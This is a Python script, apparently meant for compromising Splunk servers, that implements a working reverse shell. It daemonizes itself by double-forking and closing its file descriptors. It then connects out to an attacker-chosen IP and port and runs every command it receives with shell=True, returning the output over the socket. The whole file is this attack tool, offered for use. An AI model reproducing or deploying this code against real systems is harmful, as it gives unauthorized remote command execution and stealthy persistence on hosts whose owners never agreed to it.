#!/usr/bin/env python


#**************************************************************************#
#  Filename: py_rev_shel.py             (Created: 2016-08-18)              #
#                                       (Updated: 2025-01-23)              #
#  Info:                                                                   #
#    This was a very robust solution in python 2. I needed a quick and     #
#    dirty way to pop a reverse shell with newer versions of splunk;       #
#    Forgive my haste and I hope it's what you're looking for.             #
#  Author:                                                                 #
#    Ryan Hays (The good stuff)                                            #
#    Cole Lucas (The bad stuff)                                            #
#**************************************************************************#
import os
import sys
import socket
import threading
import time
import select
import struct
import traceback
import random
import subprocess

UMASK = 0
WORKDIR = "/"
MAXFD = 1024
REDIRECT_TO = os.devnull if hasattr(os, "devnull") else "/dev/null"

def createdaemon():
    try:
        pid = os.fork()
        if pid > 0:
            os._exit(0)  # Exit parent process
    except OSError as e:
        raise RuntimeError(f"Fork #1 failed: {e}")

    os.setsid()
    os.umask(UMASK)

    try:
        pid = os.fork()
        if pid > 0:
            os._exit(0)  # Exit first child process
    except OSError as e:
        raise RuntimeError(f"Fork #2 failed: {e}")

    maxfd = os.sysconf("SC_OPEN_MAX") if hasattr(os, "sysconf") else MAXFD
    for fd in range(0, maxfd):
        try:
            os.close(fd)
        except OSError:
            pass

    os.open(REDIRECT_TO, os.O_RDWR)
    os.dup2(0, 1)
    os.dup2(0, 2)

    return 0

def handle_connection(sock):
    try:
        while True:
            data = sock.recv(1024)
            if not data:
                break

            try:
                proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout, stderr = proc.communicate()
                sock.sendall(stdout + stderr)
            except Exception as e:
                sock.sendall(str(e).encode())
    except Exception as e:
        print(f"Connection error: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    try:
        shell_type = sys.argv[1]
        ip_address = sys.argv[2]
        port = int(sys.argv[3])
    except IndexError:
        print("Usage: python3 script.py <shell_type> <ip_address> <port>")
        sys.exit(1)

    if shell_type.lower() == 'std':
        ret_code = createdaemon()

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ip_address, port))
                handle_connection(s)
        except Exception as e:
            print(f"Error: {e}")

    else:
        print("Unsupported shell type")
        sys.exit(1)
